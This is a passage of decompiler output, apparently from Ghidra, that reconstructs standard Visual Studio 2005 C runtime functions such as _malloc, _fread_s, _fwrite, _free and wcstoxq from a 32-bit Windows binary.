        if ((*(byte *)((&DAT_00425820)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar5 = __lseek(_FileHandle,0,2);
          if (lVar5 == local_c) {
            pcVar6 = _File->_base;
            pcVar8 = pcVar6 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (*(ushort *)&pFVar7->_flag & 0x2000) == 0;
          }
          else {
            lVar5 = __lseek(_FileHandle,local_c,0);
            if (lVar5 < 0) {
              return -1;
            }
            pFVar7 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar7 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_00425820)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar7;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_c = local_c - (int)_File;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2005 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_0040b246();
  }
  return lVar2;
}



void FUN_0040b246(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2005 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_00425808) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_0040b296();
  }
  return local_20;
}



void FUN_0040b296(void)

{
  FUN_0040e37b(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2005 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (0xffffffe0 < _Size) {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
    return (void *)0x0;
  }
  do {
    if (DAT_00423eb4 == (HANDLE)0x0) {
      __FF_MSGBANNER();
      __NMSG_WRITE(0x1e);
      ___crtExitProcess(0xff);
    }
    if (DAT_004257fc == 1) {
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
LAB_0040b310:
      piVar1 = (int *)HeapAlloc(DAT_00423eb4,0,dwBytes);
    }
    else if ((DAT_004257fc != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0)) {
      sVar3 = _Size;
      if (_Size == 0) {
        sVar3 = 1;
      }
      dwBytes = sVar3 + 0xf & 0xfffffff0;
      goto LAB_0040b310;
    }
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_00424218 == 0) {
      piVar1 = __errno();
      *piVar1 = 0xc;
      goto LAB_0040b33e;
    }
    iVar2 = __callnewh(_Size);
    if (iVar2 == 0) {
LAB_0040b33e:
      piVar1 = __errno();
      *piVar1 = 0xc;
      return (void *)0x0;
    }
  } while( true );
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2005 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  uint uVar6;
  uint uVar7;
  uint _MaxCount;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize == 0) || (_Count == 0)) {
    return 0;
  }
  uVar7 = _ElementSize * _Count;
  uVar6 = uVar7;
  puVar2 = (undefined *)_DstBuf;
  uVar1 = _DstSize;
  if ((*(ushort *)&_File->_flag & 0x10c) == 0) {
    local_10 = 0x1000;
  }
  else {
    local_10 = _File->_bufsiz;
  }
joined_r0x0040b3b1:
  while( true ) {
    if (uVar6 == 0) {
      return _Count;
    }
    if ((*(ushort *)&_File->_flag & 0x10c) == 0) break;
    uVar3 = _File->_cnt;
    if (uVar3 == 0) break;
    if ((int)uVar3 < 0) goto LAB_0040b4e3;
    _MaxCount = uVar6;
    if (uVar3 <= uVar6) {
      _MaxCount = uVar3;
    }
    if (uVar1 < _MaxCount) {
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      piVar5 = __errno();
      *piVar5 = 0x22;
      goto LAB_0040b4aa;
    }
    _memcpy_s(puVar2,uVar1,_File->_ptr,_MaxCount);
    _File->_cnt = _File->_cnt - _MaxCount;
    _File->_ptr = _File->_ptr + _MaxCount;
    uVar6 = uVar6 - _MaxCount;
    uVar1 = uVar1 - _MaxCount;
    puVar2 = puVar2 + _MaxCount;
  }
  if (uVar6 < local_10) {
    iVar4 = __filbuf(_File);
    if (iVar4 == -1) goto LAB_0040b4e7;
    if (uVar1 != 0) {
      *puVar2 = (char)iVar4;
      local_10 = _File->_bufsiz;
      uVar6 = uVar6 - 1;
      uVar1 = uVar1 - 1;
      puVar2 = puVar2 + 1;
      goto joined_r0x0040b3b1;
    }
  }
  else {
    uVar3 = uVar6;
    if (local_10 != 0) {
      uVar3 = uVar6 - uVar6 % local_10;
    }
    if (uVar3 <= uVar1) {
      _DstBuf_00 = puVar2;
      iVar4 = __fileno(_File);
      iVar4 = __read(iVar4,_DstBuf_00,uVar3);
      if (iVar4 == 0) {
        _File->_flag = _File->_flag | 0x10;
        goto LAB_0040b4e7;
      }
      if (iVar4 == -1) {
LAB_0040b4e3:
        _File->_flag = _File->_flag | 0x20;
LAB_0040b4e7:
        return (uVar7 - uVar6) / _ElementSize;
      }
      uVar6 = uVar6 - iVar4;
      uVar1 = uVar1 - iVar4;
      puVar2 = puVar2 + iVar4;
      goto joined_r0x0040b3b1;
    }
  }
  if (_DstSize != 0xffffffff) {
    _memset(_DstBuf,0,_DstSize);
  }
  piVar5 = __errno();
  *piVar5 = 0x22;
LAB_0040b4aa:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2005 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_0040b582:
        __lock_file(_File);
        sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
        FUN_0040b5b5();
        return sVar2;
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_0040b582;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_0040b5b5(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2005 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2005 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_0040b6c1();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_0040b6c1(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2005 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  int iVar2;
  uint uVar3;
  size_t sVar4;
  uint uVar5;
  uint uVar6;
  size_t sVar7;
  void *_Buf;
  uint local_8;
  
  sVar1 = _Size * _Count;
  sVar4 = sVar1;
  if (sVar1 != 0) {
    sVar7 = sVar1;
    if ((*(ushort *)&_File->_flag & 0x10c) == 0) {
      local_8 = 0x1000;
    }
    else {
      local_8 = _File->_bufsiz;
    }
    do {
      uVar5 = _File->_flag & 0x108;
      if (uVar5 == 0) {
LAB_0040b745:
        if (local_8 <= sVar7) {
          if ((uVar5 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_0040b79b;
          uVar5 = sVar7;
          if (local_8 != 0) {
            uVar5 = sVar7 - sVar7 % local_8;
          }
          _Buf = _DstBuf;
          uVar3 = uVar5;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            uVar6 = uVar5;
            if (uVar3 <= uVar5) {
              uVar6 = uVar3;
            }
            _DstBuf = (void *)((int)_DstBuf + uVar6);
            sVar7 = sVar7 - uVar6;
            if (uVar5 <= uVar3) goto LAB_0040b7cd;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_0040b79b:
          return (sVar1 - sVar7) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_0040b79b;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_8 = _File->_bufsiz;
        sVar7 = sVar7 - 1;
        if ((int)local_8 < 1) {
          local_8 = 1;
        }
      }
      else {
        uVar3 = _File->_cnt;
        if (uVar3 == 0) goto LAB_0040b745;
        if ((int)uVar3 < 0) {
          _File->_flag = _File->_flag | 0x20;
          goto LAB_0040b79b;
        }
        if (sVar7 < uVar3) {
          uVar3 = sVar7;
        }
        _memcpy(_File->_ptr,_DstBuf,uVar3);
        _File->_cnt = _File->_cnt - uVar3;
        _File->_ptr = _File->_ptr + uVar3;
        sVar7 = sVar7 - uVar3;
        _DstBuf = (void *)((int)_DstBuf + uVar3);
      }
LAB_0040b7cd:
      sVar4 = _Count;
    } while (sVar7 != 0);
  }
  return sVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2005 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if (_Size * _Count != 0) {
    if ((_File != (FILE *)0x0) && (_Str != (void *)0x0)) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_0040b866();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_0040b866(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2005 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  void *this;
  
  if (_Memory != (void *)0x0) {
    if (DAT_004257fc == 3) {
      this = (void *)0x4;
      __lock(4);
      puVar1 = (uint *)thunk_FUN_0040e4f0(this,(int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_0040b8c6();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_00423eb4,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_0040b8c6(void)

{
  FUN_0040e37b(4);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  void *this;
  
  if (_Memory != (void *)0x0) {
    if (DAT_004257fc == 3) {
      this = (void *)0x4;
      __lock(4);
      puVar1 = (uint *)thunk_FUN_0040e4f0(this,(int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_0040b8c6();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_00423eb4,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2005 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar2;
  }
  if (-1 < iVar2) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar3 = __flsbuf(0,&local_24);
      if (iVar3 == -1) goto LAB_0040b9e5;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar2;
    }
    iVar3 = __flsbuf(0,&local_24);
    if (iVar3 != -1) {
      return iVar2;
    }
  }
LAB_0040b9e5:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2005 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vswprintf_helper(&DAT_00410afe,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,
                                 _ArgList);
      if (iVar2 < 0) {
        *_DstBuf = L'\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2005 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  public: __thiscall std::bad_alloc::bad_alloc(void)
// 
// Library: Visual Studio 2005 Release

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this)

{
  exception::exception((exception *)this,(char **)&DAT_00422000,1);
  *(undefined **)this = &DAT_0041c2a0;
  return this;
}



undefined4 * __thiscall FUN_0040babf(void *this,byte param_1)

{
  *(undefined **)this = &DAT_0041c2a0;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    _free(this);
  }
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2005 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined *local_10 [3];
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_00423a0c & 1) == 0) {
    _DAT_00423a0c = _DAT_00423a0c | 1;
    std::bad_alloc::bad_alloc((bad_alloc *)&DAT_00423a00);
    _atexit((_func_4879 *)&LAB_0041baa1);
  }
  std::exception::exception((exception *)local_10,(exception *)&DAT_00423a00);
  local_10[0] = &DAT_0041c2a0;
  __CxxThrowException_8(local_10,&DAT_0042035c);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Library: Visual Studio 2005 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  wchar_t wVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  puVar4 = (undefined4 *)_Dest;
  if (_Count != 0) {
    do {
      wVar1 = *_Source;
      *(wchar_t *)puVar4 = wVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      _Source = _Source + 1;
      if (wVar1 == L'\0') break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2005 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(int *)this != DAT_00422d80) && ((p_Var2->_ownlocale & DAT_00422c9c) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(int *)(this + 4) != DAT_00422ba0) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_00422c9c) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2005 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  localeinfo_struct local_34;
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_0040bece;
  }
  local_c = 0;
  _C = *param_2;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = __iswctype_l(_C,8,&local_34);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_0040bcbf:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_0040bcbf;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_0040bece:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_0040bd3d;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_0040bd3d;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_0040bd3d:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_0040bece;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2005 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  localeinfo_struct *plVar2;
  
  if (DAT_00424238 == 0) {
    plVar2 = (localeinfo_struct *)&DAT_00422d88;
  }
  else {
    plVar2 = (localeinfo_struct *)0x0;
  }
  _Var1 = wcstoxq(plVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040bf1a;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040bf1a:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2005 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
